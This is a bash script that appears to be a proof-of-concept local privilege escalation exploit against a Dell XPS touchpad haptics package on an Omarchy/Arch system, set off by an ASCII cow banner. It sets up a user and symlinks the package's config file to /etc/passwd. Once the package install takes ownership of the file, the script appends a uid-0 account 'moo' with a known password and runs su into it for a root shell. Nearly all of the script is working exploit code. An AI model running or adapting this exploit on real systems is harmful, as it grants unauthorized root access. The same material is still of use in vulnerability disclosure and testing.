#!/usr/bin/env bash
set -euo pipefail

cat <<'EOF'
       /)       (\
  .-._((,~"~.))_.-,
   `-.   e   e   ,-'
      / ,o---o. \
     ( ( .___. ) )
      ) `-----' (  
     /`-.__ __.-'\'
EOF

user=researcher
home=/home/$user
config=$home/.config/omarchy/dell-haptic.conf
done=/tmp/moo.done

case ${1:-setup} in
setup)
  (( EUID == 0 )) || exit 1

  id "$user" &>/dev/null || useradd -m -s /bin/bash "$user"
  mkdir -p "$home/.config/omarchy"
  chown -R "$user:$user" "$home/.config"
  rm -f "$config" "$done"

  (
    sleep 5
    OMARCHY_HAPTIC_USER="$user" \
      pacman -S --noconfirm dell-xps-touchpad-haptics >/dev/null 2>&1 || true
    touch "$done"
  ) &

  sleep 1
  exec runuser -u "$user" -- bash "$0" attacker
  ;;

attacker)
  (( EUID != 0 )) || exit 1

  ln -s /etc/passwd "$config"

  while [[ ! -e $done ]]; do
    sleep 1
  done

  stat -c '/etc/passwd owner=%U uid=%u mode=%A' /etc/passwd
  [[ $(stat -c %u /etc/passwd) == "$EUID" ]] || exit 1

  hash=$(openssl passwd -6 piratemoo)
  printf 'moo:%s:0:0:moo:/root:/bin/bash\n' "$hash" >>/etc/passwd

  exec su - moo
  ;;

*)
  exit 1
  ;;
esac
